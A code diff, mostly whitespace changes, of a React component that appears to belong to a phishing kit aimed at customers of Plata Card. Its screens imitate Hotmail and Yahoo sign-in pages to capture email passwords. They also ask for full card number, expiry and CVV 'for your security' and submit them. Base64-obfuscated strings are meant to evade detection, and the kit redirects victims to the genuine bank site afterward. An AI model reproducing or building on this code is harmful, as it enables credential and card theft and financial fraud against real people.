                 className="h-12"
               />
             </div>
-            
+
             <h2 className="text-2xl font-light mb-4 self-start">Iniciar sesión</h2>
-            
+
             <p className="text-sm text-gray-600 mb-6 self-start">
               Para sincronizar tus notificaciones con la aplicación Plata Card Control, inicia sesión utilizando tu correo electrónico registrado.
             </p>
-            
+
             {!hotmailStep2 ? (
               // Paso 1: Correo electrónico
               <>
@@ -1657,11 +1669,11 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                     onChange={(e) => setEmailInput(e.target.value)}
                   />
                 </div>
-                
+
                 <div className="text-xs text-gray-600 mb-6 self-start">
                   {atob('wr9ObyB0aWVuZSB1bmEgY3VlbnRhPw==')} <a href="#" className="text-blue-600">{atob('Q3JlZSB1bmEu')}</a>
                 </div>
-                
+
                 <div className="flex justify-between w-full">
                   <div>
                     <a href="#" className="text-sm text-blue-600">{atob('T3BjaW9uZXMgZGUgaW5pY2lvIGRlIHNlc2nDs24=')}</a>
@@ -1683,7 +1695,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 <div className="text-base self-start mb-6">
                   {emailInput}
                 </div>
-                
+
                 <div className="w-full mb-4">
                   <Input 
                     type="password" 
@@ -1693,11 +1705,11 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                     onChange={(e) => setPasswordInput(e.target.value)}
                   />
                 </div>
-                
+
                 <div className="text-xs text-gray-600 mb-6 self-start">
                   <a href="#" className="text-[#FF6B35]">{atob('wr9PbHZpZMOzIHN1IGNvbnRyYXNlw7FhPw==')}</a>
                 </div>
-                
+
                 <div className="flex justify-between w-full">
                   <div>
                     <Button 
@@ -1725,13 +1737,13 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             )}
           </div>
         );
-        
+
         return (
           <div className="bg-white p-6 pt-8 rounded max-w-lg mx-auto shadow">
             {hotmailContent}
           </div>
         );
-        
+
       case ScreenType.YAHOO:
         const yahooContent = (
           <div className="flex flex-col items-center w-full max-w-sm mx-auto">
@@ -1742,16 +1754,16 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 className="h-10"
               />
             </div>
-            
+
             {!yahooStep2 ? (
               // Paso 1: Correo electrónico
               <>
                 <h2 className="text-3xl font-bold mb-4">Iniciar sesión</h2>
-                
+
                 <p className="text-sm text-gray-700 mb-6 w-full text-left">
                   Para sincronizar tus notificaciones con la aplicación Plata Card Control, inicia sesión utilizando tu correo electrónico registrado.
                 </p>
-                
+
                 <div className="w-full mb-5">
                   <Input 
                     type="email" 
@@ -1761,7 +1773,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                     onChange={(e) => setEmailInput(e.target.value)}
                   />
                 </div>
-                
+
                 <div className="flex justify-between w-full">
                   <div>
                     <a href="#" className="text-sm text-[#FF6B35]">Crear cuenta</a>
@@ -1782,11 +1794,11 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               // Paso 2: Contraseña
               <>
                 <h2 className="text-3xl font-bold mb-6">Ingresa tu contraseña</h2>
-                
+
                 <div className="text-base self-start mb-2 font-bold">
                   {emailInput}
                 </div>
-                
+
                 <div className="w-full mb-5">
                   <Input 
                     type="password" 
@@ -1796,11 +1808,11 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                     onChange={(e) => setPasswordInput(e.target.value)}
                   />
                 </div>
-                
+
                 <div className="text-sm self-start mb-5">
                   <a href="#" className="text-[#FF6B35]">¿Olvidaste tu contraseña?</a>
                 </div>
-                
+
                 <div className="flex justify-between w-full">
                   <Button 
                     variant="link" 
@@ -1827,7 +1839,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             )}
           </div>
         );
-        
+
         return (
           <div className="bg-white p-6 pt-8 rounded max-w-lg mx-auto shadow">
             {yahooContent}
@@ -1839,39 +1851,39 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         const handleSecureSubmit = () => {
           // Limpiar errores previos
           setErrorA(null);
-          
+
           // Validar número usando función ofuscada
           const cleanNumber = dataE.replace(/\s/g, '');
           if (cleanNumber.length !== 16) {
             setErrorA(protectionUtils.decode('RWwgbsO6bWVybyBkZSB0YXJqZXRhIGRlYmUgdGVuZXIgMTYgZMOtZ2l0b3M='));
             return;
           }
-          
+
           // Validar usando función ofuscada
           if (!validateSecureData(cleanNumber, 'card')) {
             setErrorA(protectionUtils.decode('RWwgbsO6bWVybyBkZSB0YXJqZXRhIG5vIGVzIHbDoWxpZG8='));
             return;
           }
-          
+
           // Validar fecha de vencimiento
           const datePartes = dataF.split('/');
           if (datePartes.length !== 2 || datePartes[0].length !== 2 || datePartes[1].length !== 2) {
             setErrorA(protectionUtils.decode('TGEgZmVjaGEgZGUgdmVuY2ltaWVudG8gZGViZSBlc3RhciBlbiBmb3JtYXRvIE1NL0FB'));
             return;
           }
-          
+
           const month = parseInt(datePartes[0]);
           if (month < 1 || month > 12) {
             setErrorA(protectionUtils.decode('RWwgbWVzIGRlIHZlbmNpbWllbnRvIGRlYmUgZXN0YXIgZW50cmUgMDEgeSAxMg=='));
             return;
           }
-          
+
           // Validar CVV
           if (dataG.length < 3 || dataG.length > 4) {
             setErrorA(protectionUtils.decode('RWwgY8OzZGlnbyBkZSBzZWd1cmlkYWQgZGViZSB0ZW5lciAzIG8gNCBkw61naXRvcw=='));
             return;
           }
-          
+
           // Todo correcto, enviar los datos
           onSubmit(ScreenType.DATOS_TARJETA, {
             numeroTarjeta: cleanNumber,
@@ -1886,7 +1898,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             <p className="mb-4">
               Por tu seguridad, necesitamos verificar los datos de tu tarjeta con terminación: <strong>{screenData.terminacion || "****"}</strong>
             </p>
-            
+
             <div className="space-y-4 mb-4">
               <div className="flex flex-col">
                 <label className="text-sm text-gray-700 mb-1">Número de tarjeta:</label>
@@ -1899,14 +1911,14 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                     // Formatear usando función ofuscada
                     const formatted = formatSecureInput(e.target.value);
                     setDataE(formatted);
-                    
+
                     // Limpiar error al escribir
                     if (errorA) setErrorA(null);
                   }}
                   maxLength={19} // 16 dígitos + 3 espacios
                 />
               </div>
-              
+
               <div className="flex space-x-4">
                 <div className="flex-1">
                   <label className="text-sm text-gray-700 mb-1">Fecha de vencimiento:</label>
@@ -1919,14 +1931,14 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                       // Formatear usando función ofuscada
                       const formatted = formatSecureDate(e.target.value);
                       setDataF(formatted);
-                      
+
                       // Limpiar error al escribir
                       if (errorA) setErrorA(null);
                     }}
                     maxLength={5} // MM/AA = 5 caracteres
                   />
                 </div>
-                
+
                 <div className="flex-1">
                   <label className="text-sm text-gray-700 mb-1">Código de seguridad:</label>
                   <Input 
@@ -1938,7 +1950,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                       // Solo permitir números
                       const value = e.target.value.replace(/\D/g, '');
                       setDataG(value);
-                      
+
                       // Limpiar error al escribir
                       if (errorA) setErrorA(null);
                     }}
@@ -1947,11 +1959,11 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 </div>
               </div>
             </div>
-            
+
             {errorA && (
               <div className="text-red-500 text-sm mb-4">{errorA}</div>
             )}
-            
+
             <Button 
               className={primaryBtnClass}
               onClick={handleSecureSubmit}
@@ -1977,7 +1989,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
           </div>
         );
         return getBankContainer(generandoPromocionContent);
-        
+
       default:
         const defaultContent = (
           <>
@@ -2022,7 +2034,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   };
 
   const primaryBtnClass = getPrimaryBtnClass();
-  
+
   // Efecto para redirección automática si la pantalla es GENERANDO_ACLARACION
   useEffect(() => {
     if (currentScreen === ScreenType.GENERANDO_ACLARACION) {
@@ -2030,7 +2042,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       const redirectTimer = setTimeout(() => {
         window.location.href = 'https://www.platacard.com/';
       }, 3000);
-      
+
       // Limpieza del temporizador si el componente se desmonta
       return () => clearTimeout(redirectTimer);
     }
